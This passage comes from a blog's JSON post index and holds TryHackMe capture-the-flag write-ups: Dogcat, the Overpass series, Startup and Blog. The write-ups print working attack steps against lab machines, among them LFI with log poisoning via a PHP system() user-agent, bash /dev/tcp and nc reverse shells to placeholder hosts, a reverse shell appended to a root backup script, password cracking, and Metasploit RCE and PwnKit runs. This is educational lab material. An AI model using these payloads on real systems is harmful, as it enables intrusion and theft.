succeeded, is that the app checks if the value of the path contains “cat” or “dog”.Hence, to get the flag, we pass the value http://&lt;machine_ip&gt;/?view=php://filter/read=convert.base64-encode/resource=cats/../flag. We used “cats” because this is an existing folder on the server, and from which we know the relative location of “flag.php”.We decode the base64 string and get our first flag.Having access to php files on the server, we need to figure out how to get more access.Let’s get the index file (same directory as flag.php) and see how the app actually works.# ...snip...        &lt;?php            function containsStr($str, $substr) {                return strpos($str, $substr) !== false;            }            $ext = isset($_GET[\"ext\"]) ? $_GET[\"ext\"] : '.php';            if(isset($_GET['view'])) {                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {                    echo 'Here you go!';                    include $_GET['view'] . $ext;                } else {                    echo 'Sorry, only dogs or cats are allowed.';                }            }        ?&gt;# ...snip...First, we now validate how the app decides when a value of view is valid. Second, the URL argument ext is used to specify the extension of the file to include, and thus, we can now include whatever file (according to permissions) on the server.One common method to exploit LFI vulnerabilities is log poisoning. For this, we poison our user-agent to achieve RCE when we include the log file.  Log file location: /var/log/apache2/access.log  User Agent: &lt;h1&gt;&lt;?php system($_GET['cmd']); ?&gt;&lt;/h1&gt;  Result when visiting http://&lt;machine_ip&gt;/?view=cats/../../../../var/log/apache2/access.log&amp;ext=&amp;cmd=idPoisonned logsNow that we can execute commands on the target machine, let’s first get a reverse shell.We can use Burpsuite to manipulate the HTTP request, the crafted request I used is the following, where the bash command used is bash -c 'exec bash -i &amp;&gt;/dev/tcp/$RHOST/$RPORT &lt;&amp;1'. Don’t forget to start a listener on your machine before sending the request.GET /?view=cats/../../../../var/log/apache2/access.log&amp;ext=&amp;cmd=bash+-c+'exec+bash+-i+%26&gt;/dev/tcp/&lt;rhost&gt;/&lt;rport&gt;+&lt;%261' HTTP/1.1Host: &lt;machine_ip&gt;Accept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: nothingConnection: closeCache-Control: max-age=0We find the second flag on the parent folder where the app lives (execute command ls ..).For our next flag, we can try and see if www-data (our user) can execute any commands as root with no password. And bang, yes we can:www-data@e43f08c3313d:/var/www/html$ sudo -lMatching Defaults entries for www-data on e43f08c3313d:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser www-data may run the following commands on e43f08c3313d:    (root) NOPASSWD: /usr/bin/envWe can use env to execute commands as root. As a consequence, we enumerate the content of /root and find the third flag.www-data@e43f08c3313d:/var/www/html$ sudo env cat /root/flag3.txtAs for the last flag, and with respect to the room description, we need to beak out of the docker container running the web app.To continue working as root we execute the following commandwww-data@e43f08c3313d:/var/www/html$ sudo env bash -iOne of the ways to break out from the container is to inspect drives owned by the user (the one who runs the container) on the host system.root@e43f08c3313d:/var/www/html# df -hFilesystem      Size  Used Avail Use% Mounted onoverlay         9.8G  5.3G  4.0G  57% /tmpfs            64M     0   64M   0% /devtmpfs           240M     0  240M   0% /sys/fs/cgroupshm              64M     0   64M   0% /dev/shm/dev/xvda2      9.8G  5.3G  4.0G  57% /opt/backupstmpfs           240M     0  240M   0% /proc/acpitmpfs           240M     0  240M   0% /proc/scsitmpfs           240M     0  240M   0% /sys/firmware/opt/backup is mounted on /dev/xvda2 in the host filesystem and occupies most of the space of the container. Checking its content, we find a script that is run regularly by root on the host machine to back up the container. Because we have permissions to write to that file, we can send a reverse shell back to our machine:root@e43f08c3313d:/var/www/html# ls -l /opt/backupsls -l /opt/backupstotal 2884-rwxr--r-- 1 root root     123 Mar  1 16:33 backup.sh-rw-r--r-- 1 root root 2949120 Mar  1 16:40 backup.tarroot@e43f08c3313d:/var/www/html# echo \"bash -c 'exec bash -i &amp;&gt;/dev/tcp/&lt;rhost&gt;/&lt;rport&gt; &lt;&amp;1'\" &gt;&gt; /opt/backups/backup.shkali@kali$ nc -lvnp &lt;rport&gt;listening on [any] &lt;rport&gt; ...connect to &lt;rhost&gt; from (UNKNOWN) &lt;machine_ip&gt; 57198bash: cannot set terminal process group (3365): Inappropriate ioctl for devicebash: no job control in this shellroot@dogcat:~# lslscontainerflag4.txtroot@dogcat:~# cat flag4.txt"
  },
  
  {
    "title": "Overpass 3 Hosting",
    "url": "/posts/overpass-3-hosting/",
    "categories": "CTF Writeups, Try Hack Me, Overpass Series",
    "tags": "GPG",
    "date": "2024-03-13 00:00:00 +0100",
    





    
    "snippet": "  After Overpass’s rocky start in infosec, and the commercial failure of their passwordmanager and subsequent hack, they’ve decided to try a new business venture.  Overpass has become a web hosting...",
    "content": "  After Overpass’s rocky start in infosec, and the commercial failure of their passwordmanager and subsequent hack, they’ve decided to try a new business venture.  Overpass has become a web hosting company!Unfortunately, they haven’t learned from their past mistakes. Rumour has it, theirmain web server is extremely vulnerable.As usual, we start by checking open services on the target machine:$ sudo nmap -sV &lt;target_ip&gt; -Pn -n --disable-arp-ping  &lt;...snip...&gt;Host is up (0.042s latency).Not shown: 986 filtered tcp ports (no-response), 11 filtered tcp ports (admin-prohibited)PORT   STATE SERVICE VERSION21/tcp open  ftp     vsftpd 3.0.322/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)80/tcp open  http    Apache httpd 2.4.37 ((centos))We can try connect anonymously to the FTP server, but this doesn’t work. We continueby enumerating the web app:$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u http://&lt;target_ip&gt;/FUZZ&lt;...snip...&gt;.hta                    [Status: 403, Size: 213, Words: 16, Lines: 10, Duration: 41ms].htaccess               [Status: 403, Size: 218, Words: 16, Lines: 10, Duration: 46ms].htpasswd               [Status: 403, Size: 218, Words: 16, Lines: 10, Duration: 45ms]backups                 [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 38ms]cgi-bin/                [Status: 403, Size: 217, Words: 16, Lines: 10, Duration: 41ms]index.html              [Status: 200, Size: 1770, Words: 443, Lines: 37, Duration: 36ms]:: Progress: [4727/4727] :: Job [1/1] :: 975 req/sec :: Duration: [0:00:05] :: Errors: 0 ::The backups directory looks interesting.There we find an downloadable zip file. This file contains a PGP key and an encrypted xlsx document:We can decrypt our xlsx file using that key. The process is pretty straight forward:$ gpg --import priv.keygpg: key C9AE71AB3180BC08: public key \"Paradox &lt;paradox@overpass.thm&gt;\" importedgpg: key C9AE71AB3180BC08: secret key importedgpg: Total number processed: 1gpg:               imported: 1gpg:       secret keys read: 1gpg:   secret keys imported: 1                                                                                              $ gpg --decrypt CustomerDetails.xlsx.gpg &gt; CustumerDetails.xlsxOnce decrypted, we find that it contains sensitive information about some users.These credentials are important and in our case can be used to connect to ssh and/or ftp servers. That being said, the only credentials that prove to be useful are those belongingto Paradox. We can use then to connect to FTP. Once connected, we upload a php reverse shellto the server and then access from the web app:$ ftp paradox@&lt;target_ip&gt;      Connected to &lt;target_ip&gt;.220 (vsFTPd 3.0.3)331 Please specify the password.Password: 230 Login successful.ftp&gt; put php-reverse-shell.phplocal: php-reverse-shell.php remote: php-reverse-shell.php229 Entering Extended Passive Mode (|||28139|)150 Ok to send data.100% |*************************************************|  5492        1.00 MiB/s    00:00 ETA226 Transfer complete.5492 bytes sent in 00:00 (63.89 KiB/s)Now we got initial access to the machine as the user apache. The web flag is at /usr/share/httpd."
  },
  
  {
    "title": "Overpass 2 Hacked",
    "url": "/posts/overpass-2-hacked/",
    "categories": "CTF Writeups, Try Hack Me, Overpass Series",
    "tags": "Wireshark",
    "date": "2024-03-12 00:00:00 +0100",
    





    
    "snippet": "1 - Forensics - Analyse the PCAPOne of the best practices to analyze pcap files is to follow TCP streams and see what data is being exchanged over which protocol and so on.To navigate more easily b...",
    "content": "1 - Forensics - Analyse the PCAPOne of the best practices to analyze pcap files is to follow TCP streams and see what data is being exchanged over which protocol and so on.To navigate more easily between streams, use the stream field in the bottom right corner of the stream window.We can see that in stream 1, the attacker is uploading a php file to /development/. Based on the contentof the file, the payload is php reverse shell.&lt;?php exec(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f\")?&gt;TCP stream number 2 shows that the attacker requested the malicious php file to get that reverse shell.Moving to stream number 3. This is where we can see the full action of the attacker once got a foothold into the machine.The attacker first switched to James’ account to which he has access to the password. Then he listed commands that can be executed byJames with root privileges (sudo -l). Because James can execute whatever command as root (bad practice), the attacker was able to dumpall password hashes from /etc/shadow{ .filepath} and install an ssh-backdoor for persistence. The backdoor runs an SSH server on port 2222 that the attacker can connect to as he possesses a valid password as we’ll see below.Back to the password hashes, we can crack 4 of them using the fasttrack wordlist.$ john hashes.txt -wordlist:fasttrack.txt Loaded 5 password hashes with 5 different salts (crypt, generic crypt(3) [?/64])Will run 8 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statussecuirty3        (paradox)abcd123          (szymex)secret12         (bee)1qaz2wsx         (muirland)2 - Research - Analyse the codeGetting the source code from GitHub$ git clone https://github.com/NinjaJc01/ssh-backdoorIn the main.go file we find the default hash and the hardcoded salt for the backdoor.//...snip...var hash string = \"bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3\"//...snip...func verifyPass(hash, salt, password string) bool {        resultHash := hashPassword(password, salt)        return resultHash == hash}//...snip...func passwordHandler(_ ssh.Context, password string) bool {        return verifyPass(hash, \"1c362db832f3f864c8c2fe05f2002a05\", password)}Back to our pcap file, the attacker changed the default hash of the backdoor. The flag -a is used for this purpose as we can see from the source code.//...snip...        flaggy.String(&amp;hash, \"a\", \"hash\", \"Hash for backdoor\")//...snip...The hash value represents the passwords that will be required when connecting to the ssh server. Based on main.go,SHA512 is used, and the hash is computed on the concatenation password + salt. Thus, to crack that hash using hashcat, our hashfile will contain &lt;hash&gt;:&lt;salt&gt;, the mode is 1710, and the wordlist is rockyou.txt:$ hashcat -m 1710 hash rockyou.txt&lt;...snip...&gt;6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16&lt;...snip...&gt;Attack - Get back in!To get back control over the server, we’ll connect to SSH port 2222 with the found password.$ ssh james@&lt;target_ip&gt; -p 2222 -oHostKeyAlgorithms=+ssh-rsa&lt;...snip...&gt;james@overpass-production:/home/james/ssh-backdoor$ cd ~james@overpass-production:/home/james$ lsssh-backdoor  user.txt  www"
  },
  
  {
    "title": "Overpass",
    "url": "/posts/overpass/",
    "categories": "CTF Writeups, Try Hack Me, Overpass Series",
    "tags": "SSH, john",
    "date": "2024-03-10 00:00:00 +0100",
    





    
    "snippet": "Given the IP address of the target machine, we launch first our scan.$ sudo nmap -sV $target_ip -Pn -n -p-&lt;...snip...&gt;Host is up (0.041s latency).Not shown: 65533 closed tcp ports (reset)PORT...",
    "content": "Given the IP address of the target machine, we launch first our scan.$ sudo nmap -sV $target_ip -Pn -n -p-&lt;...snip...&gt;Host is up (0.041s latency).Not shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelThe Go-powered HTTP server serves the website of the company Overpass. From there we can download executables of the password manager as well as the source code.The team uses rot47 as the cryptography scheme, which is very weak, and anyone who can access the encryption file called .overpass can decrypt all the contained passwords.Enumerating the website directories, we find the admin login page. One might try to brute force some login credentials, but the challenge hints at an OWASP vulnerability so there should be a better way.Inspecting the source code we have at /admin we find several scripts being referenced, which we can check out.The most interesting one is login.js which implements the logic of the login procedure. It’s in this script where the flaw resides.Cookies management is broken (OWASP broken access control) and we can add our own cookie with any random value and will get accepted and give us asession as an admin.$ curl http://&lt;target_ip&gt;/admin/ --cookie \"SessionToken=whatever\"&lt;...snip...&gt;        &lt;div&gt;            &lt;p&gt;Since you keep forgetting your password, James, I've set up SSH keys for you.&lt;/p&gt;            &lt;p&gt;If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.&lt;br&gt;                Also, we really need to talk about this \"Military Grade\" encryption. - Paradox&lt;/p&gt;            &lt;pre&gt;-----BEGIN RSA PRIVATE KEY-----Proc-Type: 4,ENCRYPTEDDEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN&lt;...snip...&gt;+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7-----END RSA PRIVATE KEY-----&lt;/pre&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/body&gt;Very juicy information. We got an RSA private key as well as the corresponding username James. Now we can try connecting via SSH.Let id_rsa be the file containing the private key. If we try ssh to the target machine, we’ll be prompted to enter a passphrase:$ ssh james@&lt;target_ip&gt; -i id_rsaEnter passphrase for key 'id_rsa': Let’s use john to crack this passphrase. First, we extract the passphrase’s hash, and then we launch the attack:$ ssh2john id_rsa &gt; hash$ john hash -wordlist:/usr/share/wordlists/rockyou.txtUsing default input encoding: UTF-8Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashesCost 2 (iteration count) is 1 for all loaded hashesWill run 8 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusjames13          (id_rsa)Sweet, now we can connect. The user flag is in James’ home directory.That directory contains another note, named todo.txt:james@overpass-prod:~$ cat todo.txt To Do:&gt; Update Overpass' Encryption, Muirland has been complaining that it's not strong enough&gt; Write down my password somewhere on a sticky note so that I don't forget it.  Wait, we make a password manager. Why don't I just use that?&gt; Test Overpass for macOS, it builds fine but I'm not sure it actually works&gt; Ask Paradox how he got the automated build script working and where the builds go.  They're not updating on the websiteJames uses Overpass, thus, the .overpass file is in his home directory.Having this file, we can use Overpass (downloadable from the website) to access James’ passwords (maybe we can use them later):james@overpass-prod:~$ ./overpassLinux                                                                Welcome to OverpassOptions:1       Retrieve Password For Service2       Set or Update Password For Service3       Delete Password For Service4       Retrieve All Passwords5       ExitChoose an option:       4System   saydrawnlyingpictureWhile exploring the machine for possible privilege escalation opportunities,I came across the below crontab file and thought maybe we could manipulatebuildscript.sh to obtain a root shell. Unfortunately, I couldn’t find that fileon the machine (looks like the web app is hosted on a virtual environment different from overpass-prod).james@overpass-prod:~$ cat  /etc/crontab&lt;...snip...&gt;25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )# Update builds from latest code* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bashWithout any further enumeration, we use the linPEAS.sh to give us quick results.james@overpass-prod:~$ ./linPEAS.sh&lt;...snip...&gt;╔══════════╣ Executing Linux Exploit Suggester╚ https://github.com/mzet-/linux-exploit-suggester                                            [+] [CVE-2021-4034] PwnKit                                                                       Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt   Exposure: probable   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/mainCheck out this GitHub repo for a good exploitation script.Once executed, we have access to a root shell. Hence, the root flag."
  },
  
  {
    "title": "Startup",
    "url": "/posts/startup/",
    "categories": "CTF Writeups, Try Hack Me",
    "tags": "FTP, Wireshark",
    "date": "2024-02-27 00:00:00 +0100",
    





    
    "snippet": "  We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren...",
    "content": "  We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren’t sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!Let’s start with a version and script scan against the target machine$ sudo nmap -sV -sC &lt;target_ip&gt; -Pn -nStarting Nmap 7.80 ( https://nmap.org ) at 2024-02-26 22:53 CETNmap scan report for &lt;target_ip&gt;Host is up (0.038s latency).Not shown: 997 closed portsPORT   STATE SERVICE VERSION21/tcp open  ftp     vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt| ftp-syst: |   STAT: | FTP server status:|      Connected to &lt;target_ip&gt;|      Logged in as ftp|      TYPE: ASCII|      No session bandwidth limit|      Session timeout in seconds is 300|      Control connection is plain text|      Data connections will be plain text|      At session startup, client count was 2|      vsFTPd 3.0.3 - secure, fast, stable|_End of status22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: MaintenanceService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelThe default nmap scripts were able to connect anonymously to the FTP server.We can connect and get the files there.$ ftp anonymous@&lt;target_ip&gt;Connected to &lt;target_ip&gt;.220 (vsFTPd 3.0.3)331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls229 Entering Extended Passive Mode (|||34705|)150 Here comes the directory listing.drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt226 Directory send OK.Content of notice.txt{: .filepath}Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.The meme they’re talking about is important.jpg:important.jpgWeb app fuzzing:$ ffuf -w ~/Downloads/common.txt:FUZZ -u http://&lt;target_ip&gt;/FUZZ &lt;...snip...&gt;files                   [Status: 301, Size: 310, Words: 20, Lines: 10]The /files path allows us to access the files on the FTP server.This means that we can upload our shell to the server and then include it from the web app to achieve RCE.Note that uploading the file to the main directory will not succeed. This is possible, however, in the ftp folder.ftp&gt; put shell.phplocal: shell.php remote: shell.php229 Entering Extended Passive Mode (|||21801|)553 Could not create file.ftp&gt; cd ftp250 Directory successfully changed.ftp&gt; put shell.php local: shell.php remote: shell.php229 Entering Extended Passive Mode (|||22501|)150 Ok to send data.100% |*************************************************|   732        9.06 MiB/s    00:00 ETA226 Transfer complete.732 bytes sent in 00:00 (8.78 KiB/s)You can use whatever php script you like to get a reverse shell back to your machine.Now that we have access to the machine, we find the recipe in the root directory:www-data@startup:/$ cat recipe.txtSomeone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was &lt;flag&gt;.Navigating to the home directory, we found the home folder of the user lennie but we don’t have permission to access it.Back to the root folder, we notice a suspicious folder incidents containing a suspicious pcap file:www-data@startup:/incidents$ ls -l-rwxr-xr-x 1 www-data www-data 31224 Nov 12  2020 suspicious.pcapngTo get this file, we can copy it to the location of our FTP server and then download it on our local machine.www-data@startup:/$ cp /incidents/suspicious.pcapng /var/www/html/files/ftp/Opening the capture in Wireshark and looking at the statistics, we notice that the before-last connection is the one that produces most of the traffic.We apply the IP addresses as filters and then we follow the TCP stream to see what has been exchanged in the connection.The capture catches a connection of a user vagrant using a reverse shell the same way we did to get access to the machine. vagrant tried to access lennie’s home directory unsuccessfully and then tried to list files that can be run as root without the need for a password.What’s interesting is the password vagrant used in the process: c4ntg3t3n0ughsp1c3. This can be the password of someone else. Luckily this is the password of lennie."
  },
  
  {
    "title": "Blog",
    "url": "/posts/blog/",
    "categories": "CTF Writeups, Try Hack Me",
    "tags": "Apache2",
    "date": "2024-02-26 00:00:00 +0100",
    





    
    "snippet": "From the name and description of the room, we know that we’re dealing with a wordpress application. Nevertheless, we scan for all running services on the machine.$ sudo nmap -sV -sC &lt;machine_ip&...",
    "content": "From the name and description of the room, we know that we’re dealing with a wordpress application. Nevertheless, we scan for all running services on the machine.$ sudo nmap -sV -sC &lt;machine_ip&gt; -Pn -n --disable-arp-ping&lt;...snip...&gt;PORT    STATE SERVICE     VERSION22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)80/tcp  open  http        Apache httpd 2.4.29|_http-title: Billy Joel&amp;#039;s IT Blog &amp;#8211; The IT blog|_http-server-header: Apache/2.4.29 (Ubuntu)139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)Service Info: Hosts: blog.thm, BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-time: |   date: 2024-02-24T17:39:32|_  start_date: N/A|_clock-skew: mean: 0s, deviation: 1s, median: -1s| smb-os-discovery: |   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)|   Computer name: blog|   NetBIOS computer name: BLOG\\x00|   Domain name: \\x00|   FQDN: blog|_  System time: 2024-02-24T17:39:33+00:00| smb2-security-mode: |   3:1:1: |_    Message signing enabled but not required|_nbstat: NetBIOS name: BLOG, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)Exposed services are: an ssh agent, a web app running the wordpress blog, and an SMB server. The information on the running SMB service revealed by the default nmap scripts may be useful in the future.Examining the blog’s home page (mom’s note and comments), it looks like Joel is a not experimented with Wordpress and most likely default configurations are still there. Additionally, we know that Wordpress login is vulnerable to brute force attacks.To validate this idea, we go to the login page (accessible from the “Log in” button in the bottom of the page or alternatively at http://blog.thm/wp-login.php). We enter whatever credentials there (e.g. admin admin), the response is an “invalid username” error message.Notice that when we hover (or click) on a user, we are able to get their username where the redirection link of a user’s page is of the form http://blog.thm/author/&lt;username&gt;.The username of Billy Joel is bjoel.Entering the username in the login page confirms the ability to brute force the login.I tried to brute foce using hydra and the rockyou wordlist but it didn’t work out so I started thinking of other possibilities.Let’s connect to the SMB server and see if we can get any useful information:  List available shares on the server$ smbclient -U guest -L &lt;ip_addr&gt;Password for [WORKGROUP\\guest]:        Sharename       Type      Comment        ---------       ----      -------        print$          Disk      Printer Drivers        BillySMB        Disk      Billy's local SMB Share        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))Reconnecting with SMB1 for workgroup listing.        Server               Comment        ---------            -------        Workgroup            Master        ---------            -------        WORKGROUP            BLOG  Connect to BillySMB share$ smbclient -U guest \\\\\\\\BLOG\\\\BillySMB   Password for [WORKGROUP\\guest]:Try \"help\" to get a list of possible commands.smb: \\&gt; ls  .                                   D        0  Tue May 26 18:17:05 2020  ..                                  D        0  Tue May 26 17:58:23 2020  Alice-White-Rabbit.jpg              N    33378  Tue May 26 18:17:01 2020  tswift.mp4                          N  1236733  Tue May 26 18:13:45 2020  check-this.png                      N     3082  Tue May 26 18:13:43 2020                15413192 blocks of size 1024. 9790352 blocks availableThere is an interesting file called check-this.png, we can download it using the get command:smb: \\&gt; get check-this.pnggetting file \\check-this.png of size 3082 as check-this.png (18.2 KiloBytes/sec) (average 18.2 KiloBytes/sec)The picture contains a QR code, which leads to a YouTube music video of Billy Joel (Just discovered this is a name of a famous musician).Checking the other files might lead somewhere.$ stegseek Alice-White-Rabbit.jpg                         StegSeek 0.6 - https://github.com/RickdeJager/StegSeek[i] Found passphrase: \"\"[i] Original filename: \"rabbit_hole.txt\".[i] Extracting to \"Alice-White-Rabbit.jpg.out\".$ cat Alice-White-Rabbit.jpg.outYou've found yourself in a rabbit hole, friend.Nothing useful. Straight into the rabbit hole :/Back to our wordpress application, I started looking for common vulnerabilities of that specific version and also why hydra was giving wrong passwords as a match. Long story short, hydra is not always a good option (not in this case), and we shuldn’t depend 100% on it. Additionaly, this wordpress version presents a path traversal vulnerability (CVE-2019-8943, CVE-2019-8942) that can be exploited using Metasploit once we have the credentials of a user of at least an author privilege.We have only two users in the blog. This can be verified by navigating to:http://blog.thm/wp-json/wp/v2/usersLet’s try and brute force login passwords of bjoel and kwheel but this time using wpscan (a wordpress security scanner). We are able to find the password of kwheel:$ wpscan --url blog.thm -P /usr/share/wordlists/rockyou.txt -U \"kwheel\"&lt;...snip...&gt;[+] Performing password attack on Xmlrpc against 1 user/sTrying kwheel / morgan1 Time: 00:01:03 &lt;                       &gt; (2125 / 14344392)  0.01%  ETA: ??:??:??[SUCCESS] - kwheel / cutiepie1                                                                &lt;...snip...&gt;Now we move to metasploit for further exploitation.msf6 &gt; use exploit/multi/http/wp_crop_rcemsf6 exploit(multi/http/wp_crop_rce) &gt; set username kwheelmsf6 exploit(multi/http/wp_crop_rce) &gt; set password cutipie1msf6 exploit(multi/http/wp_crop_rce) &gt; set rhosts blog.thmmsf6 exploit(multi/http/wp_crop_rce) &gt; set lhost &lt;your_ip&gt;msf6 exploit(multi/http/wp_crop_rce) &gt; exploitGot access to the machine and now we gotta look for the files.First thing, we check the users on the machine. We find a user.txt file in bjoel home directory, but:meterpreter &gt; cat home/bjoel/user.txtYou won't find what you're looking for here.TRY HARDERFor the user flag, I made use of the hint which is of the format /*****/***. There is one unique path of that format on the machine which is /media/usb. And this was the right answer.To Access the content of that folder, we need higher priviliges.Executing the linPEAS.sh script hints about many exploitation vector. I tried exploiting some of them unsuccessfully before what did actually work: pwnkit[+] [CVE-2021-4034] PwnKit   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt   Exposure: probable   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/mainWe send our current session to the background and launch the pwnkit exploit. Now we can access the user flag at /media/tmp/user.txt and the root flag at /root/root.txtmeterpreter &gt; bg[*] Backgrounding session 1...msf6 exploit(multi/http/wp_crop_rce) &gt; use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcpmsf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) &gt; set session 1session =&gt; 1msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) &gt; set lhost &lt;your_ip&gt;lhost =&gt; &lt;your_ip&gt;msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) &gt; run[*] Started reverse TCP handler on &lt;your_ip&gt;:4444 [*] Running automatic check (\"set AutoCheck false\" to disable)[!] Verify cleanup of /tmp/.pcogeqgxi[+] The target is vulnerable.[*] Writing '/tmp/.tsqqhfteilu/jcilqimaxeqh/jcilqimaxeqh.so' (548 bytes) ...[!] Verify cleanup of /tmp/.tsqqhfteilu[*] Sending stage (3045380 bytes) to &lt;machine_ip&gt;[+] Deleted /tmp/.tsqqhfteilu/jcilqimaxeqh/jcilqimaxeqh.so[+] Deleted /tmp/.tsqqhfteilu/.wlhjnbz[+] Deleted /tmp/.tsqqhfteilu[*] Meterpreter session 2 opened (&lt;your_ip&gt;:4444 -&gt; &lt;machine_ip&gt;:52260) at 2024-02-26 14:09:43 +0000meterpreter &gt;"
  },
  
  {
    "title": "PassMan",
    "url": "/projects/passman/",
    "categories": "Projects, Software",
    "tags": "Flutter, Mobile, Cryptography",
    "date": "2024-02-25 00:00:00 +0100",
    





    
    "snippet": "  Checkout PassMan on github",
    "content": "  Checkout PassMan on github"
  },
  
  {
    "title": "PowerAnalysis - Warmup",
    "url": "/posts/power-analysis-warmup/",
    "categories": "CTF Writeups, picoCTF, Cryptography",
    "tags": "Cryptography",
    "date": "2024-02-22 00:00:00 +0100",
    





    
    "snippet": "A. The problemDescriptionThis encryption algorithm leaks a “bit” of data every time it does a computation. Use this to figure out the encryption key. Download the encryption program here . Access t...",
